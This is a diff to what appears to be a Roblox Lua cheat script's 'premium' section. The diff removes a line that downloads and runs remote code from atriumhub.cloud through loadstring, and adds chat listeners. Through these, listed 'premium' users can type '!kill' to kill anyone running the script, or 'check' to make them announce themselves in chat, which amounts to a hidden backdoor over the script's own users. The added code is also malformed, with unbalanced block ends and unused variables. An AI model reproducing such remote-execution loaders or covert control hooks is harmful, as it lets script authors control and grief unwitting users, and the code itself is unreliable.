@@ -9084,8 +9084,28 @@ local PremiumUsers = {
       Notification.new("info", "Checking", "Checking if you're a premium user...")
       wait(2)
       Notification.new("error", "Premium Commands", "Not a premium User!")
+
 if table.find(PremiumUsers, player.UserId) then
-    wait(15)
-    loadstring(game:HttpGet('https://www.atriumhub.cloud/scripts/premium.lua'))()
+    local LocalPlayer = game:GetService("Players").LocalPlayer
+game.ReplicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(message)
+    local player = message.FromSpeaker
+    local chat = message.Message
+    if string.find(chat,"!kill") and table.find(PremiumUsers, player.UserId) then
+        local split = chat:split(" ")
+
+        plr = game.Players:FindFirstChild(split[2])
+        game.Players.LocalPlayer.Character.Humanoid.Health = 0
+end
+if table.find(PremiumUsers, player.UserId) then
+    local LocalPlayer = game:GetService("Players").LocalPlayer
+game.ReplicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(message)
+    local player = message.FromSpeaker
+    local chat = message.Message
+    if string.find(chat,"check") and table.find(PremiumUsers, player.UserId) then
+        local split = chat:split(" ")
+
+        plr = game.Players:FindFirstChild(split[2])
+        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Im a premium user", "All")
+end
 end
 end
